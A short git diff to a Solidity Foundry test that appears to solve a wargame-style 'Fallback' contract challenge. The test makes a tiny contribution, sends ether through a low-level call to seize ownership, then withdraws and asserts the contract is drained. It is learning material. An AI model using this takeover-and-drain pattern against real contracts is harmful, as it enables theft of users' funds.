@@ -26,13 +26,21 @@ contract CounterTest is Test {
     function test_drainFunds() public {
         vm.startPrank(NewOwner);
         fallBack.contribute{value: 0.0001 ether}();
-        console.log(fallBack.getContribution());
-        address fallBackContractAddress = address(fallBack);
-        (bool callSuccess, ) = payable(fallBackContractAddress).call{value: 1e9}("");
         
+        console.log(fallBack.getContribution());
+
+        address fallBackContractAddress = address(fallBack);
+
+        (bool callSuccess, ) = payable(fallBackContractAddress).call{value: 1e9}("");
+
+        require(callSuccess, "Low-Level call failed");
+
         assertEq(NewOwner, fallBack.owner());
+
         fallBack.withdraw();
+
         vm.stopPrank();
+        
         assertEq(fallBackContractAddress.balance, 0);
     }
 
